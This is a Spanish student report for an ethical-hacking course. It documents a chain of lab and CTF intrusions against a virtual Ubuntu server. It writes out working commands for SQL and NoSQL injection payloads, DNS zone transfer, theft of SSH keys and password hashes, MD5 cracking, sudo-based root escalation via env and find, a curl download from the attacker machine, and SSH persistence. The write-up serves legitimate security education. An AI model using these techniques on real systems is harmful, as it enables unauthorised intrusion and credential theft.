# Reporte Técnico Consolidado: Auditoría de Seguridad, Explotación y Post-Explotación en Laboratorio Virtual

**Alumno:** Roberto Lozano Acosta – 24110022 – 6°B  
**Profesor:** Jorge Alberto Chamorro Martínez  
**Materia:** Hacking Ético  
**Máquina Atacante:** Kali Linux GUI (`192.168.1.4`)  
**Máquina Objetivo:** Ubuntu Server 22.04 LTS (`192.168.1.101` / `cetilab.local`)  
**Fecha:** 19 de Octubre 2026  

---

## 1. Contexto Previo: Cadena de Intrusión Inicial (Prácticas 1 a 6 primer Parcial)

El presente reporte documenta la fase avanzada de explotación, post-explotación, transferencia de artefactos y consolidación de persistencia realizada en el laboratorio `cetipracticas`. La intrusión previa sentó las bases para el acceso inicial al servidor `ubuntuServer` (`192.168.1.101`):

1. **Reconocimiento y Descubrimiento de Red (`nmap`)**:  
   El escaneo de red (`nmap -sn 192.168.1.0/24`) localizó la máquina objetivo en la dirección `192.168.1.101` con múltiples servicios expuestos (FTP 21, SSH 22, SMTP 25, DNS 53, HTTP 80, RPC/NFS 111/2049, SMB 139/445, SNMP 161, HTTP-Alt 8080).
2. **Transferencia de Zona DNS AXFR (`dig`)**:  
   Mediante la consulta `dig @192.168.1.101 cetilab.local -t axfr`, el servidor DNS expuso 11 subdominios internos críticos: `app.cetilab.local`, `db-mongo.cetilab.local`, `db-mysql.cetilab.local`, `files.cetilab.local`, `ftp.cetilab.local`, `mail.cetilab.local`, `nfs.cetilab.local`, `ns1.cetilab.local`, `snmp.cetilab.local`, `ssh.cetilab.local` y `www.cetilab.local`.
3. **Auditoría Web y Enumeración de Virtual Hosts (`gobuster` & Burp Suite)**:  
   El escaneo de VHOSTs con `gobuster` validó el alojamiento del portal interno en `app.cetilab.local`. La interceptación HTTP con Burp Suite identificó parámetros vulnerables a inyección SQL en la consulta de `/login` y `/archivos_ti`.
4. **Acceso a Recursos Compartidos SMB (`smbmap` / `cifs`)**:  
   Se utilizó `smbmap -H cetilab.local` para detectar el recurso `archivos_ti` accesible en modo solo lectura mediante una *null session*. El montaje en `/mnt/archivoCompartido` reveló dos archivos de texto: `nota_desarrollo.txt` (confirmando el servicio FTP) y `respaldo_credenciales.txt` con el hash MD5 de la contraseña del usuario `ftpuser`.
5. **Reconocimiento SNMP v2c (`snmpwalk`)**:  
   La enumeración SNMP con comunidad `public` (`snmpwalk -v 2c -c public cetilab.local`) expuso en el campo `sysLocation`:
   ```text
   NFS_EXPORT: /srv/nfs/respaldos_ti | TARGET_USER: developer
   ```
6. **Exfiltración de Llave SSH por NFS y Crackeo MD5 (`john`)**:  
   Se montó el recurso NFS en `/mnt/respaldos` (`mount -t nfs cetilab.local:/srv/nfs/respaldos_ti /mnt/respaldos`), localizando la llave privada `developer.key`. Tras asignarle permisos `chmod 600`, se utilizó para acceder como `developer` vía SSH. Paralelamente, con John the Ripper y la máscara `Ceti?d?d?d?d`, se crackeó el hash MD5 (`fcd065c1541dc1f64cce023e9f9e4900`), obteniendo la clave `Ceti2245`.


### 1.1 Portafolio de Evidencias Detallado — Primer Parcial (Prácticas 1 a 6)

A continuación, se integra el registro técnico completo y las evidencias gráficas detalladas correspondientes a las Prácticas 1 a 6 del Primer Parcial desarrolladas en la infraestructura `cetipracticas` contra el servidor objetivo `ubuntuServer` (`192.168.1.101` / `cetilab.local`), las cuales culminaron con la obtención de acceso como `developer` y la escalada a superusuario `root`:

#### Práctica 1: Reconocimiento y Descubrimiento de Red (Nmap)

Para dar inicio al proceso de auditoría, realizamos en primer lugar un barrido de pings sobre el segmento de red NAT correspondiente al direccionamiento IP `192.168.1.0/24` mediante la herramienta Nmap. El propósito primordial de esta fase inicial fue identificar todos los hosts activos dentro del alcance delimitado, logrando ubicar con éxito la dirección IP del objetivo principal en `192.168.1.101`.

Posteriormente, procedimos a ejecutar un escaneo exhaustivo de puertos y servicios utilizando las opciones de scripts por defecto y detección de versiones (`-sC -sV`) sobre dicha dirección IP. Esto nos permitió mapear detalladamente los servicios expuestos y determinar con precisión la superficie de ataque disponible en la infraestructura evaluada.

![Evidencia P1.1: Barrido de red ICMP (nmap -sn 192.168.1.0/24) localizando el objetivo en 192.168.1.101](docs/assets/portafolio_parcial1/page_03_img_01_X21.png)

![Evidencia P1.2: Escaneo exhaustivo de puertos y servicios (nmap -sC -sV 192.168.1.101) - Puertos 21, 22, 25, 53 y 80](docs/assets/portafolio_parcial1/page_04_img_01_X24.png)

![Evidencia P1.3: Detección de servicios RPCBind (111), Samba SMB (139/445), NFS (2049) y Nginx (8080)](docs/assets/portafolio_parcial1/page_04_img_02_X25.png)

![Evidencia P1.4: Resumen de enumeración de servicios y scripts NSE en la máquina cetipracticas](docs/assets/portafolio_parcial1/page_05_img_01_X28.png)

#### Práctica 2: Modificación de /etc/hosts y Transferencia de Zona DNS (AXFR)

Posteriormente a la fase de descubrimiento, llevamos a cabo la modificación estratégica del archivo de resolución local `/etc/hosts` para vincular el nombre de dominio `admin-backup` con la dirección IP identificada (`192.168.1.101`), garantizando la correcta resolución dentro del entorno de pruebas.

A continuación, tras detectar la presencia del servicio DNS operativo en el puerto 53, evaluamos posibles fallas de configuración y ejecutamos una consulta de transferencia de zona (`axfr`) utilizando la herramienta `dig` contra el dominio `cetilab.local`. Como resultado de una indebida restricción en la política del servidor DNS, logramos obtener la resolución completa de la zona, enumerando exitosamente la totalidad de los 11 subdominios internos asociados al objetivo.

![Evidencia P2.1: Comprobación de conectividad y resolución mediante ping a admin-backup (192.168.1.101)](docs/assets/portafolio_parcial1/page_06_img_01_X32.png)

![Evidencia P2.2: Transferencia de zona DNS completa (dig @192.168.1.101 cetilab.local -t axfr)](docs/assets/portafolio_parcial1/page_06_img_02_X33.png)

![Evidencia P2.3: Actualización masiva del archivo /etc/hosts con los 11 subdominios descubiertos](docs/assets/portafolio_parcial1/page_06_img_03_X34.png)

#### Práctica 3: Construcción de Diccionario y Enumeración de Virtual Hosts (Gobuster)

A partir de los hallazgos obtenidos durante la transferencia de zona, procedimos a construir un diccionario de palabras personalizado denominado `diccionario.txt`, integrando cada uno de los subdominios identificados previamente. Con este insumo, empleamos la herramienta Gobuster en su modo de enumeración de hosts virtuales (`vhost`) para iterar y validar sistemáticamente la existencia y respuesta HTTP de cada subdominio. A través de este proceso de fuerza bruta dirigida, determinamos fehacientemente que `app.cetilab.local` correspondía al servicio web activo y receptivo (Status: 200, Size: 1233) dentro del entorno auditado.

![Evidencia P3.1: Ejecución de Gobuster en modo vhost contra http://cetilab.local utilizando diccionario.txt](docs/assets/portafolio_parcial1/page_07_img_01_X37.png)

![Evidencia P3.2: Identificación exitosa del Virtual Host activo: app.cetilab.local (Status: 200 [Size: 1233])](docs/assets/portafolio_parcial1/page_07_img_02_X38.png)

#### Práctica 4: Auditoría Web con FoxyProxy y Burp Suite (Inyección SQL)

Con el objetivo de auditar la aplicación web descubierta, configuramos el complemento FoxyProxy en el navegador web local para redirigir el tráfico saliente hacia el puerto 8080, donde se encontraba en ejecución la suite de interceptación Burp Suite. A continuación, capturamos exitosamente la petición HTTP de tipo POST generada al intentar autenticarnos en la interfaz de inicio de sesión.

Tras transferir la solicitud al módulo Repeater, realizamos pruebas de inyección SQL mediante la inserción del payload `' or 1=1 --` en el campo del nombre de usuario. Esta acción permitió eludir los controles de autenticación de la aplicación y acceder al panel interno, donde se desplegó un memorándum del sistema que reveló explícitamente la existencia y ruta del recurso compartido en red vía SMB denominado `archivos_ti`.

![Evidencia P4.1: Configuración del proxy interceptor con FoxyProxy apuntando a Burp Suite (puerto 8080)](docs/assets/portafolio_parcial1/page_08_img_01_X41.png)

![Evidencia P4.2: Interceptación de la petición HTTP POST de login en Burp Suite Proxy](docs/assets/portafolio_parcial1/page_09_img_01_X44.png)

![Evidencia P4.3: Inyección SQL en Burp Repeater con el payload ' or 1=1 -- en el parámetro de usuario](docs/assets/portafolio_parcial1/page_09_img_02_X45.png)

![Evidencia P4.4: Evasión exitosa de autenticación y acceso a la interfaz interna de administración](docs/assets/portafolio_parcial1/page_10_img_01_X48.png)

![Evidencia P4.5: Visualización de nota interna revelando el recurso compartido //app.cetilab.local/archivos_ti](docs/assets/portafolio_parcial1/page_10_img_02_X49.png)

#### Práctica 5: Enumeración SMB, Montaje CIFS, Reconocimiento SNMP y Montaje NFS

Una vez descubiertos los recursos compartidos, iniciamos la fase de explotación con la herramienta `smbmap` para enumerar los permisos de acceso sobre el recurso SMB identificado. Tras verificar la posibilidad de acceso de lectura anónima, realizamos el montaje del sistema de archivos mediante CIFS, accediendo a la estructura de archivos y extrayendo credenciales en texto plano (`nota_desarrollo.txt` y `respaldo_credenciales.txt`). En paralelo, exploramos el servicio FTP para recuperar notas de desarrollo adicionales.

Posteriormente, ejecutamos un escaneo SNMP con `snmpwalk` (comunidad `public`), descubriendo la exportación de un punto de montaje NFS oculto localizado en `/srv/nfs/respaldos_ti` y el usuario objetivo `developer`. Al efectuar el montaje de dicho sistema NFS, extrajimos la clave privada SSH `developer.key`. Finalmente, tras asignarle los permisos de seguridad adecuados mediante `chmod 600`, establecimos exitosamente una sesión remota cifrada vía SSH como el usuario `developer`.

![Evidencia P5.1: Enumeración de recursos compartidos SMB mediante smbmap -H cetilab.local (archivos_ti READ ONLY)](docs/assets/portafolio_parcial1/page_11_img_01_X52.png)

![Evidencia P5.2: Montaje de //app.cetilab.local/archivos_ti y lectura de nota_desarrollo.txt y respaldo_credenciales.txt](docs/assets/portafolio_parcial1/page_11_img_02_X53.png)

![Evidencia P5.3: Enumeración SNMP con snmpwalk filtrando sysLocation (fuga de /srv/nfs/respaldos_ti y developer)](docs/assets/portafolio_parcial1/page_11_img_03_X54.png)

![Evidencia P5.4: Montaje NFS en /mnt/respaldos, exfiltración de developer.key y asignación de permisos chmod 600](docs/assets/portafolio_parcial1/page_12_img_01_X57.png)

#### Práctica 6: Crackeo de Hash MD5 con John the Ripper y Acceso SSH

Durante la extracción de artefactos del sistema objetivo, obtuvimos un hash de contraseña en formato MD5 compuesto por 32 caracteres hexadecimales (`fcd065c1541dc1f64cce023e9f9e4900`). Para recuperar el texto claro asociado, llevamos a cabo un ataque de fuerza bruta fuera de línea (offline) utilizando la herramienta John the Ripper.

Aprovechando el conocimiento adquirido en las etapas previas de reconocimiento sobre los patrones de nomenclatura del sistema, definimos una máscara personalizada (`Ceti?d?d?d?d`). Esta optimización redujo significativamente el espacio de búsqueda y el tiempo de cómputo necesario, permitiéndonos obtener la contraseña en texto plano (`Ceti2245`) en cuestión de segundos y consolidar el acceso por SSH como `developer@cetipracticas`.

![Evidencia P6.1: Almacenamiento del hash MD5 en hash_practica6.txt](docs/assets/portafolio_parcial1/page_13_img_01_X60.png)

![Evidencia P6.2: Crackeo exitoso del hash con John the Ripper y máscara Ceti?d?d?d?d (Contraseña: Ceti2245)](docs/assets/portafolio_parcial1/page_13_img_02_X61.png)

![Evidencia P6.3: Conexión remota SSH exitosa hacia developer@cetilab.local mediante developer.key](docs/assets/portafolio_parcial1/page_14_img_01_X64.png)

#### Cierre del Primer Parcial: Escalada de Privilegios a Root (GTFOBins) y Bandera Final

Ya entrando al servidor SSH, se descubrió que el usuario `developer` tenía permitido ejecutar ciertos comandos `sudo` dada la directiva `NOPASSWD` que tenía este, dándonos así posibilidad de ejecutar binarios comunes y mediante estos usar la técnica de GTFOBins para así escalar en privilegios a usuario `root` y así poder visualizar el archivo `/root/root.txt`. Dándonos así el flag final: `FLAG FINAL: CETI{R00T_PR1V3SC_GTF0B1NS_M4ST3R_2026}`.

Ruta completa de intrusión confirmada: `DNS -> HTTP (SQLi) -> SAMBA -> FTP -> SNMP -> NFS -> SSH -> SMTP -> NoSQLi -> ROOT`.

![Evidencia P6.4: Inspección de privilegios sudo (sudo -l) revelando binarios con directiva NOPASSWD](docs/assets/portafolio_parcial1/page_15_img_01_X67.png)

![Evidencia P6.5: Escalada a root ejecutando sudo env /bin/bash y confirmación de identidad (whoami / id)](docs/assets/portafolio_parcial1/page_16_img_01_X70.png)

![Evidencia P6.6: Visualización de /root/root.txt con la bandera final de compromiso del servidor](docs/assets/portafolio_parcial1/page_16_img_02_X71.png)

#### Automatización Inicial mediante Script en Bash (auto_hack.sh)

Como parte de los entregables y para optimizar la repetibilidad de los procedimientos realizados durante la auditoría, desarrollamos un script interactivo en Bash (`auto_hack.sh`) encargado de automatizar de forma secuencial los pasos técnicos descritos. El script gestiona de manera transparente el aprovisionamiento local (limpieza e inserción masiva de entradas en `/etc/hosts`), el montaje condicional de recursos SMB/NFS, la extracción de claves y el ataque con John the Ripper, incorporando pausas para la captura de pantalla.

![Evidencia P6.7: Ejecución secuencial automatizada con auto_hack.sh en la máquina atacante Kali Linux](docs/assets/portafolio_parcial1/page_17_img_01_X74.png)

---

## 2. Práctica 1: Local Port Forwarding e Inyección NoSQL (NoSQLi)

### 2.1 Concepto y Justificación Técnica
Determinados servicios y paneles de administración internos (como instancias de bases de datos o paneles de microservicios) están configurados para escuchar exclusivamente en la interfaz de bucle invertido (`127.0.0.1`) de la máquina objetivo, impidiendo el acceso directo desde el segmento de red externo. 

Para acceder al servicio web interno que opera en el puerto `5000` de `ubuntuServer`, se estableció un túnel SSH con redirección de puerto local (*Local Port Forwarding*):

```bash
ssh -i /home/kali/developer.key -L 5000:127.0.0.1:5000 developer@192.168.1.101
```

Con este túnel, cualquier petición enviada a `http://127.0.0.1:5000` en la máquina atacante Kali Linux es cifrada y encapsulada por SSH hacia el servidor objetivo, que la entrega localmente al proceso en escucha.

### 2.2 Explotación de la Vulnerabilidad NoSQLi
Al acceder a `http://127.0.0.1:5000/`, se identificó una API que autentica usuarios contra una base de datos NoSQL (MongoDB) mediante solicitudes POST en formato JSON a la ruta `/login`.

Dado que las consultas en bases de datos orientadas a documentos evalúan objetos JSON como filtros directos, el envío de operadores lógicos de MongoDB permite eludir la validación si la aplicación no sanitiza los tipos de datos. Al inyectar el operador `$ne` (*not equal*) con valor `null`, la consulta verifica que el usuario y la contraseña simplemente existan y no sean nulos, resultando en una condición lógica siempre verdadera (`true`):

#### Petición HTTP Interceptada (Burp Suite / cURL):
```http
POST /login HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/json
Connection: close
Content-Length: 83

{
    "username": {
        "$ne": null
    },
    "password": {
        "$ne": null
    }
}
```

#### Respuesta del Servidor:
```http
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 98
Server: Werkzeug/2.0.2 Python/3.10.12
Date: Mon, 05 Oct 2026 04:12:38 GMT

{
    "flag": "CETI{NOSQLi_P0rt_F0rw4rd_M4st3r}",
    "message": "Autenticacion Correcta",
    "status": "success"
}
```

> **Bandera Obtenida:** `CETI{NOSQLi_P0rt_F0rw4rd_M4st3r}`

![Evidencia 01: Petición y Respuesta NoSQLi con Flag](docs/assets/practica1_nosqli/01_nosqli_flag.png)

---

## 3. Práctica 2: Escalada Básica de Privilegios y Transferencia de Archivos

### 3.1 Enumeración de Privilegios Sudo (`sudo -l`)
Una vez dentro de la sesión de `developer`, se auditó la configuración de `sudoers` ejecutando `sudo -l`:

```text
Matching Defaults entries for developer on cetipracticas:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User developer may run the following commands on cetipracticas:
    (ALL) NOPASSWD: /usr/bin/awk
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/python3
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /usr/bin/env
```

### 3.2 Escalada Inmediata mediante `/usr/bin/env`
El binario `/usr/bin/env` ejecuta un comando en un entorno modificado. Al estar autorizado con privilegios de superusuario sin contraseña (`NOPASSWD`), permite invocar directamente un intérprete de comandos con UID 0:

```bash
developer@cetipracticas:~$ sudo env /bin/bash
root@cetipracticas:/home/developer# whoami
root
root@cetipracticas:/home/developer# id
uid=0(root) gid=0(root) groups=0(root)
```

### 3.3 Transferencia Bidireccional de Archivos
Para desplegar herramientas adicionales o exfiltrar información entre el anfitrión atacante y el servidor comprometido:
1. En Kali Linux (`192.168.1.4`), se levantó un servidor web liviano:
   ```bash
   python3 -m http.server 8000
   ```
2. Desde la máquina objetivo (`192.168.1.101`), se descargó el artefacto requerido mediante `curl`:
   ```bash
   curl http://192.168.1.4:8000/file.txt --output file.txt
   ```
3. Se comprobó la descarga exitosa en los registros del servidor HTTP y la creación del archivo de salida.

![Evidencia 02: Escalada con sudo env y Transferencia de Archivos](docs/assets/practica2_privesc_files/01_privesc_files.png)

---

## 4. Práctica 3: Persistencia, Gestión de Identidades y Criptografía SSH

### 4.1 Criptografía y Comparativa de Algoritmos (Ed25519 vs. RSA)
En la administración moderna de infraestructura y auditorías de seguridad, la elección del algoritmo de firma para llaves SSH es crítica:

| Criterio | RSA (3072/4096 bits) | Ed25519 (EdDSA sobre Curve25519) |
| :--- | :--- | :--- |
| **Longitud de Llave** | Extensa (3072 a 4096 bits) | Muy compacta (256 bits) |
| **Rendimiento** | Mayor consumo en generación y firma | Extremadamente rápida y constante |
| **Seguridad / Resistencia** | Susceptible a ataques de canal lateral si no se implementa con precisión | Diseñada específicamente contra ataques de tiempo y canal lateral |
| **Compatibilidad** | Universal (sistemas legados) | Estándar en OpenSSH >= 6.5 |

En la máquina atacante se generó un par de llaves Ed25519 para persistencia:
```bash
ssh-keygen -t ed25519 -f ~/.ssh/llave_p -N ""
```

En la máquina objetivo, como `root`, se generó un par de llaves RSA tradicional:
```bash
ssh-keygen -t rsa -f /root/.ssh/id_rsa -N ""
```

### 4.2 Despliegue de Llaves y Manejo de Errores de Permisos
1. Se intentó desplegar la llave pública mediante `ssh-copy-id`:
   ```bash
   ssh-copy-id -i ~/.ssh/llave_p.pub developer@192.168.1.101
   ```
   El intento fue rechazado debido a que la autenticación mediante contraseña se encontraba deshabilitada en la configuración del demonio `sshd` (`PasswordAuthentication no`).
2. Se extrajo la llave privada `id_rsa` generada en el servidor hacia la máquina atacante.
3. Al intentar conectar con permisos estándar de archivo (`0664`), el cliente OpenSSH abortó la conexión por motivos de seguridad:
   ```text
   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
   @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
   Permissions 0664 for 'id_rsa' are too open.
   It is required that your private key files are NOT accessible by others.
   This private key will be ignored.
   Load key "id_rsa": bad permissions
   ```
4. **Corrección de Permisos**:
   ```bash
   chmod 600 id_rsa
   ssh -i id_rsa root@192.168.1.101
   ```
   Tras ajustar los permisos a `0600` (lectura/escritura exclusiva para el propietario), el acceso SSH como superusuario `root` se consolidó exitosamente.

![Evidencia 03: Permisos SSH 0664 y Conexión con chmod 600](docs/assets/practica3_ssh_keys/01_ssh_permissions.png)

---

## 5. Práctica 4: Post-Explotación Avanzada con GTFOBins y Reto CTF Meow (Hack The Box)

### 5.1 Explotación de Binario `find` (GTFOBins)
El proyecto GTFOBins documenta cómo binarios estándar de Unix pueden ser utilizados para eludir restricciones de seguridad locales cuando están configurados con permisos SUID o privilegios `sudo NOPASSWD`.

El binario `/usr/bin/find` dispone del parámetro `-exec`, el cual ejecuta un comando externo por cada coincidencia encontrada. Al invocarse con privilegios de superusuario:

```bash
developer@cetipracticas:~$ sudo find . -exec /bin/sh \; -quit
# whoami
root
```

El parámetro `\; -quit` asegura que la shell se genere inmediatamente en el primer ciclo y termine la búsqueda tras salir de la sesión interactiva.

### 5.2 Compromiso Total y Extracción de Flag Final
Habiendo alcanzado la sesión de superusuario, se inspeccionó el directorio raíz `/root` localizando la bandera final del laboratorio:

```bash
root@cetipracticas:~# cat /root/root.txt
========================================================================
                 ¡FELICIDADES! HAS COMPROMETIDO EL SERVIDOR
========================================================================
FLAG FINAL: CETI{R00T_PR1V3SC_GTF0B1NS_M4ST3R_2026}

Has completado con éxito la ruta de intrusión completa:
DNS -> HTTP (SQLi) -> SAMBA -> FTP -> SNMP -> NFS -> SSH -> SMTP -> NoSQLi -> ROOT
========================================================================
```

> **Bandera Final Obtenida:** `CETI{R00T_PR1V3SC_GTF0B1NS_M4ST3R_2026}`

### 5.3 Resolución del Reto CTF en Hack The Box (Máquina Meow)
Como parte de la evaluación práctica de penetración en plataformas industriales de ciberseguridad, se completó la resolución de la máquina `Meow` en la plataforma **Hack The Box (HTB)** por el operador **Lozano**:

```text
You have solved Meow!
Congratulations Lozano best of luck in capturing flags ahead!
#629953 Machine Rank
14 Oct 2026 Pwn Date
Retired Machine State
150 XP Earned
Level Up! You reached level 2. Keep up the pace!
```

![Evidencia 04: Bandera root.txt de Compromiso Total](docs/assets/practica4_gtfobins_ctf/01_root_flag.png)

![Evidencia 05: Resolución de Máquina Meow en Hack The Box por Lozano](docs/assets/practica4_gtfobins_ctf/02_htb_meow.png)

---

## 6. Anexo de Automatización e Infraestructura del Laboratorio

### 6.1 Scripts de Ejecución Idempotente
El laboratorio cuenta con un conjunto de scripts diseñados para garantizar la repetibilidad y el principio de mínimo impacto (*Zero-Footprint*):
- `scripts/practicas/parcial1_practicas_01_a_06.sh`: Automatiza el reconocimiento DNS, enumeración de subdominios, montajes CIFS/NFS y crackeo de hashes con pausas interactivas.
- `scripts/kali-lab-state.sh`: Gestiona de manera idempotente los registros en `/etc/hosts`, montajes en `/mnt/`, permisos de llaves y túneles SSH.
- `auto_hack.sh.txt` y `auto_hack_parte2.sh`: Proveen la automatización guiada para pruebas de concepto en entornos de evaluación rápida.

### 6.2 Captura Directa de Framebuffer VirtualBox (`vm-snap.ps1`)
Para eliminar artefactos visuales del anfitrión, bordes de ventanas o fallos por pérdida de foco, las capturas de pantalla se obtienen directamente de la memoria gráfica de la máquina virtual mediante la API del hipervisor:

```powershell
.\scripts\vm-snap.ps1 -VmName "Kali-Linux-CLI" -OutputPath "docs/assets/practica1_nosqli/01_nosqli_flag.png"
```

### 6.3 Pipeline de Generación a DOCX y Sincronización con Google Docs
El flujo de entrega técnica está automatizado mediante Pandoc y el CLI oficial de Google Workspace (`@googleworkspace/cli`):
1. **Compilación**: Pandoc procesa el documento Markdown resolviendo las rutas de los activos visuales:
   ```powershell
   pandoc docs/reportes/REPORTE_PRACTICAS_LOZANO.md -o docs/reportes/Reporte_Final_Lozano.docx --resource-path=.:docs:docs/reportes:docs/assets
   ```
2. **Exportación a la Nube**: El script `scripts/build-report.ps1` detecta las credenciales activas y sube el archivo resultante a Google Drive especificando `mimeType: application/vnd.google-apps.document`. Esto genera un documento de Google Docs nativo, completamente editable, con estilos, tablas y capturas preservadas.
